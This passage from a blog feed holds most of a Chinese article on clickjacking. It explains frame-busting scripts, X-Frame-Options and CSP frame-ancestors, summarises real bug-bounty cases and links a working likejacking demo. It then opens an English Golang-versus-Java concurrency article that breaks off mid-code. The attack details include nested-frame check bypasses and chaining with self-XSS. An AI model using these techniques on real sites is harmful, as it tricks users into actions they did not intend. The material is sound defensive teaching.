punctuation&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;style&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;   &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; top&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;       document&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;documentElement&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;style&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;display &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;block&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;   &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;       top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;location&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;   &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;先把網頁整個藏起來，一定要執行 JS 才能開啟，所以用上面的 sandbox 阻止 script 執行的話，就只會看到一個空白的網頁；如果不用 sandbox 的話，JS 的檢查不會過，所以還是看到一片空白。&lt;/p&gt;
&lt;p&gt;雖然說這樣可以做到比較完全的防禦，但也有缺點存在。這個缺點就是，如果使用者把 JS 功能關掉的話，他就什麼都看不到了。所以對於把 JS 功能關閉的使用者來說，體驗還滿差的。&lt;/p&gt;
&lt;p&gt;clickjacking 早期出來的時候（2008 年）可能相關防禦還沒有這麼完全，所以只好用這些方案，但在現今 2021 年，瀏覽器已經支援了其他更好的方式來阻擋網頁被嵌入。&lt;/p&gt;
&lt;h3 id=&quot;x-frame-options&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#x-frame-options&quot;&gt;#&lt;/a&gt; X-Frame-Options&lt;/h3&gt;
&lt;p&gt;這個 HTTP response header 在 2009 年時首先由 IE8 實作，接著其他瀏覽器才跟上，在 2013 年時才變成了完整的 &lt;a href=&quot;https://www.rfc-editor.org/rfc/rfc7034.txt&quot;&gt;RFC7034&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;這個 header 會有底下這三種值：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;X-Frame-Options: DENY&lt;/li&gt;
&lt;li&gt;X-Frame-Options: SAMEORIGIN&lt;/li&gt;
&lt;li&gt;X-Frame-Options: ALLOW-FROM &lt;a href=&quot;https://example.com/&quot;&gt;https://example.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;第一種就是拒絕任何網頁把這個網頁嵌入，包含 &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt; 這些 tag 都不行。&lt;/p&gt;
&lt;p&gt;第二個則是只有 same origin 的網頁可以，最後一個則是只允許特定的 origin 嵌入，除此之外其他的都不行（只能放一個值不能放列表，所以如果要多個 origin，要像 CORS header 那樣在 server 動態調整輸出）。&lt;/p&gt;
&lt;p&gt;在 RFC 裡面還有特別提到最後兩種的判定方式可能跟你想的不一樣，每個瀏覽器的實作會有差異。&lt;/p&gt;
&lt;p&gt;例如說有些瀏覽器可能只檢查「上一層」跟「最上層」，而不是每一層都檢查。這個「層」是什麼意思呢？因為 iframe 理論上可以有無限多層嘛，A 嵌入 B 嵌入 C 嵌入 D...&lt;/p&gt;
&lt;p&gt;如果把這關係化為類似 html tag 的話，會長得像這樣：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;example.com/A.html&amp;gt;
  &amp;lt;attacker.com&amp;gt;
    &amp;lt;example.com/B.html&amp;gt;
        &amp;lt;example.com/target.html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;對於最內層的 target.html 來說，如果瀏覽器只檢查上一層（B.html）跟最上層（A.html）的話，那儘管設置成 &lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt;，檢查還是會通過，因為這兩層確實是相同的 origin。但實際上，中間卻夾了一個惡意網頁在裡面，所以還是有被攻擊的風險。&lt;/p&gt;
&lt;p&gt;除此之外 &lt;code&gt;X-Frame-Options&lt;/code&gt; 還有第二個問題，就是 &lt;code&gt;ALLOW-FROM&lt;/code&gt; 的支援度不好，可以參考底下來自 &lt;a href=&quot;https://caniuse.com/?search=X-Frame-Options&quot;&gt;caniuse&lt;/a&gt; 的表格，黃色的都是不支援 &lt;code&gt;ALLOW-FROM&lt;/code&gt; 的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/huli/clickjacking-intro/caniuse.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;X-Frame-Options&lt;/code&gt; 最前面的 &lt;code&gt;X&lt;/code&gt; 說明了它比較像是一個過渡時期的東西，在未來新的瀏覽器當中，它的功能會被 CSP（Content Security Policy）給取代，並且把上面提到的問題解決。&lt;/p&gt;
&lt;h3 id=&quot;csp%3A-frame-ancestors&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#csp%3A-frame-ancestors&quot;&gt;#&lt;/a&gt; CSP: frame-ancestors&lt;/h3&gt;
&lt;p&gt;在之前的文章：&lt;a href=&quot;https://tech-blog.cymetrics.io/posts/huli/xss-attack-and-defense/&quot;&gt;淺談 XSS 攻擊與防禦的各個環節&lt;/a&gt;裡面我有稍微講了一下 CSP 這個東西，基本上就是告訴瀏覽器一些安全性相關的設置，其中有一個屬性是 &lt;code&gt;frame-ancestors&lt;/code&gt;，設定起來會像這樣：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Content-Security-Policy: frame-ancestors &#39;none&#39;&lt;/li&gt;
&lt;li&gt;Content-Security-Policy: frame-ancestors &#39;self&#39;&lt;/li&gt;
&lt;li&gt;Content-Security-Policy: frame-ancestors &lt;a href=&quot;https://a.example.com/&quot;&gt;https://a.example.com&lt;/a&gt; &lt;a href=&quot;https://b.example.com/&quot;&gt;https://b.example.com&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;這三種剛好對應到了之前 X-Frame-Options 的三種：DENY, SAMEORIGIN 以及 ALLOW-FROM（但這次有支援多個 origin 了）。&lt;/p&gt;
&lt;p&gt;先講一個可能會被搞混的地方，&lt;code&gt;frame-ancestors&lt;/code&gt; 限制的行為跟 X-Frame-Options 一樣，都是「哪些網頁可以把我用 iframe 嵌入」，而另外一個 CSP 規則 &lt;code&gt;frame-src&lt;/code&gt; 則是：「我這個網頁允許載入哪些來源的 iframe」。&lt;/p&gt;
&lt;p&gt;例如說我在 index.html 設一個規則是 &lt;code&gt;frame-src: &#39;none&#39;&lt;/code&gt;，那 index.html 裡面用 &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt; 載入任何網頁都會被擋下來，不管那個網頁有沒有設置任何東西。&lt;/p&gt;
&lt;p&gt;再舉個例子，我的 index.html 設置成：&lt;code&gt;frame-src: https://example.com&lt;/code&gt;，但是 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; 也有設置：&lt;code&gt;frame-ancestors: &#39;none&#39;&lt;/code&gt;，那 index.html 還是沒有辦法用 iframe 把 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; 載入，因為對方拒絕了。&lt;/p&gt;
&lt;p&gt;總而言之，&lt;code&gt;frame-src&lt;/code&gt; 是「跟我交往好嗎？」，&lt;code&gt;frame-ancestors&lt;/code&gt; 則是對於這個請求的回答。我可以設置成 &lt;code&gt;frame-ancestors: &#39;none&#39;&lt;/code&gt;，代表任何人來跟我告白我都說不要。瀏覽器要成功顯示 iframe，要兩方都同意才行，只要其中一方不同意就會失敗。&lt;/p&gt;
&lt;p&gt;另外，值得注意的是 frame-ancestors 是 CSP level2 才支援的規則，在 2014 年年底才漸漸開始被主流瀏覽器們所支援。&lt;/p&gt;
&lt;h3 id=&quot;%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%98%B2%E7%A6%A6%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 防禦總結&lt;/h3&gt;
&lt;p&gt;因為支援度的關係，所以建議 &lt;code&gt;X-Frame-Options&lt;/code&gt; 跟 CSP 的 &lt;code&gt;frame-ancestors&lt;/code&gt;一起使用，若是你的網頁不想被 iframe 載入，記得加上 HTTP response header：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors &#39;none&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;若是只允許被 same origin 載入的話，設置成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors &#39;self&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果要用 allow list 指定允許的來源，則是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;X-Frame-Options: ALLOW-FROM https://example.com/
Content-Security-Policy: frame-ancestors https://example.com/
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%AF%A6%E9%9A%9B%E6%A1%88%E4%BE%8B&quot;&gt;#&lt;/a&gt; 實際案例&lt;/h2&gt;
&lt;p&gt;接著我們來看一些實際的 clickjacking 案例，會對這個攻擊更有感覺一點。&lt;/p&gt;
&lt;h3 id=&quot;yelp&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#yelp&quot;&gt;#&lt;/a&gt; Yelp&lt;/h3&gt;
&lt;p&gt;美國最大的餐廳評論網站 Yelp 有幾個關於 clickjacking 的 report：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/305128&quot;&gt;ClickJacking on IMPORTANT Functions of Yelp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://hackerone.com/reports/355859&quot;&gt;CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse.&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;雖然說沒辦法達到奪取帳號這種很嚴重的攻擊，但還是可以造成一些危害，例如說自己註冊一間餐廳之後：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;幫使用者訂位，藉此偷到他們的 email&lt;/li&gt;
&lt;li&gt;幫使用者訂位，使用者要取消訂位的話就要付取消訂位的費用，造成錢財損失&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;對於看不爽的餐廳，也可以靠這方法去製造很多假的訂位，讓餐廳無從辨別（因為都是真的使用者來訂位）&lt;/p&gt;
&lt;h3 id=&quot;twitter-periscope-clickjacking-vulnerability&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#twitter-periscope-clickjacking-vulnerability&quot;&gt;#&lt;/a&gt; Twitter Periscope Clickjacking Vulnerability&lt;/h3&gt;
&lt;p&gt;原始報告：&lt;a href=&quot;https://hackerone.com/reports/591432&quot;&gt;https://hackerone.com/reports/591432&lt;/a&gt;&lt;br&gt;
日期：2019 年 5 月&lt;/p&gt;
&lt;p&gt;這個 bug 是因為相容性問題，網頁只設置了 &lt;code&gt;X-Frame-Options ALLOW-FROM&lt;/code&gt; 而沒有設置 CSP，這樣的話其實沒什麼用，因為現在的瀏覽器都不支援 &lt;code&gt;ALLOW-FROM&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;解法很簡單，就是加上 CSP 的 frame-ancestors，讓現代瀏覽器也遵守這個規則。&lt;/p&gt;
&lt;h3 id=&quot;highly-wormable-clickjacking-in-player-card&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#highly-wormable-clickjacking-in-player-card&quot;&gt;#&lt;/a&gt; Highly wormable clickjacking in player card&lt;/h3&gt;
&lt;p&gt;原始報告：&lt;a href=&quot;https://hackerone.com/reports/85624&quot;&gt;https://hackerone.com/reports/85624&lt;/a&gt;&lt;br&gt;
日期：2015 年 8 月&lt;/p&gt;
&lt;p&gt;這個漏洞滿有趣的，運用了前面所提到的瀏覽器實作問題。這個案例是 twitter 已經有設置 &lt;code&gt;X-Frame-Options: SAMEORIGIN&lt;/code&gt; 跟 &lt;code&gt;Content-Security-Policy: frame-ancestors &#39;self&#39;&lt;/code&gt;，但當時有些瀏覽器實作檢查時，只檢查 top window 是不是符合條件。&lt;/p&gt;
&lt;p&gt;換句話說，如果是 &lt;a href=&quot;http://twitter.com/&quot;&gt;twitter.com&lt;/a&gt; =&amp;gt; &lt;a href=&quot;http://attacker.com/&quot;&gt;attacker.com&lt;/a&gt; =&amp;gt; &lt;a href=&quot;http://twitter.com/&quot;&gt;twitter.com&lt;/a&gt;，就會通過檢查，所以還是可以被惡意網頁嵌入。&lt;/p&gt;
&lt;p&gt;再加上這個漏洞發生在 twitter 的 timeline，所以可以達成蠕蟲的效果，clickjacking 之後就發推，然後就會有更多人看到，更多人發同樣的推文。&lt;/p&gt;
&lt;p&gt;作者的 writeup 寫得很棒，但部落格掛掉了，這是存檔：&lt;a href=&quot;http://web.archive.org/web/20190310161937/https://blog.innerht.ml/google-yolo/&quot;&gt;Google YOLO&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%5Bapi.tumblr.com%5D-exploiting-clickjacking-vulnerability-to-trigger-self-dom-based-xss&quot;&gt;#&lt;/a&gt; [&lt;a href=&quot;http://api.tumblr.com/&quot;&gt;api.tumblr.com&lt;/a&gt;] Exploiting clickjacking vulnerability to trigger self DOM-based XSS&lt;/h3&gt;
&lt;p&gt;原始報告：&lt;a href=&quot;https://hackerone.com/reports/953579&quot;&gt;https://hackerone.com/reports/953579&lt;/a&gt;&lt;br&gt;
日期：2020 年 8 月&lt;/p&gt;
&lt;p&gt;會特別挑這個案例，是因為它是攻擊鍊的串接！&lt;/p&gt;
&lt;p&gt;在 XSS 漏洞中有一種叫做 self XSS，意思就是通常都要使用者自己做一些操作才會中招，所以影響十分有限，許多 program 也都不接受 self XSS 的漏洞。&lt;/p&gt;
&lt;p&gt;而這份報告把 self XSS 跟 clickjacking 串連在一起，透過 clickjacking 的方式讓使用者去觸發 self XSS，串連攻擊鍊讓這個攻擊更容易被達成，可行性更高。&lt;/p&gt;
&lt;p&gt;以上就是一些 clickjacking 相關的實際案例，值得注意的是有一些是因為相容性問題造成的 issue，而不是沒有設定，所以設定正確也是很重要的一件事。&lt;/p&gt;
&lt;h2 id=&quot;%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%84%A1%E6%B3%95%E9%98%B2%E7%A6%A6%E7%9A%84-clickjacking%EF%BC%9F&quot;&gt;#&lt;/a&gt; 無法防禦的 clickjacking？&lt;/h2&gt;
&lt;p&gt;clickjacking 防禦的方式說穿了就是不要讓別人可以嵌入你的網頁，但如果這個網頁的目的就是讓別人嵌入，那該怎麼辦？&lt;/p&gt;
&lt;p&gt;例如說 Facebook widget，大家常看到的那些「讚」跟「分享」的按鈕，就是為了讓其他人可以用 iframe 嵌入的，這類型的 widget 該怎麼辦呢？&lt;/p&gt;
&lt;p&gt;根據這兩篇：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/clickjacking-attack-on-facebook-how-tiny-attribute-save-corporation/&quot;&gt;Clickjacking Attack on Facebook: How a Tiny Attribute Can Save the Corporation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/61968091/facebook-like-button-click&quot;&gt;Facebook like button click&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;裡面得到的資訊，或許目前只能降低一點使用者體驗來換取安全性，例如說點了按鈕之後還會跳出一個 popup 讓你確認，對使用者來說多了一個點擊，但是也避免了 likejacking 的風險。&lt;/p&gt;
&lt;p&gt;或是我猜可能也會根據網站的來源決定是否有這個行為，舉例來說在一些比較有信譽的網站，可能就不會跳出這個 popup。&lt;/p&gt;
&lt;p&gt;我有做了一個簡單的 demo 網頁：&lt;a href=&quot;https://aszx87410.github.io/demo/clickjacking/like.html&quot;&gt;https://aszx87410.github.io/demo/clickjacking/like.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果 likejacking 成功的話，點了按鈕之後會對 Facebook Developer Plugin 的粉專按讚（我自己實驗是有成功啦），大家可以試試看，按完以後可以按「顯示原始網頁」看看按鈕底下長什麼樣子，順便把讚收回來。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B8%BD%E7%B5%90&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B8%BD%E7%B5%90&quot;&gt;#&lt;/a&gt; 總結&lt;/h2&gt;
&lt;p&gt;比起以前瀏覽器支援度還沒有這麼完整的時代，現在已經幸福許多了，瀏覽器也實作了愈來愈多的安全性功能以及新的 response header，透過瀏覽器保護使用者避免惡意攻擊。&lt;/p&gt;
&lt;p&gt;雖然說平均來講 clickjacking 的攻擊難易度、先備條件以及影響程度通常都比 XSS 或是 CSRF 之類的攻擊來得低，但依然是不可忽視的風險之一。&lt;/p&gt;
&lt;p&gt;如果你的網頁沒有要讓別的網站嵌入，記得設置 &lt;code&gt;X-Frame-Options: DENY&lt;/code&gt; 以及 &lt;code&gt;Content-Security-Policy: frame-ancestors &#39;none&#39;&lt;/code&gt;，告訴瀏覽器你的網頁不能被嵌入，藉此防止點擊劫持攻擊。&lt;/p&gt;
&lt;p&gt;參考資料：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCLICKJACKING.md&quot;&gt;TOPCLICKJACKING.md&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-frame-options-header-types&quot;&gt;Clickjacking Defense Cheat Sheet&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://content-security-policy.com/frame-ancestors/&quot;&gt;CSP frame-ancestors&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

		</content>
	</entry>
	
	<entry>
		<title>Concurrency Paradigms: Golang V.S. Java</title>
		<link href="https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-en/"/>
		<updated>2021-08-29T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/genchilu/concurrency-paradigms-golang-and-java-en/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;p&gt;I find that I was just using Golang&#39;s syntax to write Java after I reviewed the Golang code I wrote years ago, I was a newbie in Golang then. Especially in writing concurrency programs, the design ideas are totally different between Golang and Java: we are used to designing concurrency with the idea &amp;quot;thread-safe&amp;quot; in Java, but we would use the idea &amp;quot;channel&amp;quot; more in Golang.&lt;/p&gt;
&lt;!-- summary --&gt;
&lt;p&gt;In this article, I want to discuss the different styles in writing concurrency programs between Java and Goalng, Hope that can help some newbie Golang programmers could have some basic concept while writing concurrency.&lt;/p&gt;
&lt;h1 id=&quot;what-is-paradigms&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#what-is-paradigms&quot;&gt;#&lt;/a&gt; What is Paradigms&lt;/h1&gt;
&lt;p&gt;Program paradigms are the guideline principle of how to writing a program, a higher level design pattern. For example, Object-Oriented Programming is one kind of Program paradigms. There are other program paradigms, like Functional programming. While paradigms differ in many ways, such differences are neither superior nor inferior to each other. There are suitable scenarios for each paradigm.&lt;/p&gt;
&lt;p&gt;Like program paradigms, there are also concurrency paradigms, like Thread &amp;amp; Lock is one of those paradigms that you would follow while writing Java concurrency code. On the other hand, Go&#39;s concurrency paradigm is base on Communicating Sequential Process(CSP).&lt;br&gt;
Let&#39;s deep into the difference more between these two paradigms in the following.&lt;/p&gt;
&lt;h1 id=&quot;thread-%26-lock&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#thread-%26-lock&quot;&gt;#&lt;/a&gt; Thread &amp;amp; Lock&lt;/h1&gt;
&lt;p&gt;Thread &amp;amp; Lock works like what underlying hardware does. Threads communicate with each other by sharing memory and ensure only one thread can access share memory by Lock. That&#39;s what we call mutual exclusion or mutex.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/concurrency_paradigms_golang_and_Java/thread_and_lock.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Take the classic producer-consumer problem, for example, Java&#39;s implementation may use Lock like below:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Lock&lt;/span&gt; lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;ReentrantLock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Queue&lt;/span&gt; queue &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;LinkedList&lt;/span&gt;&lt;span class=&quot;token generics&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Integer&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Condition&lt;/span&gt; con&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newCondition&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; size &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; producer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;await&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token 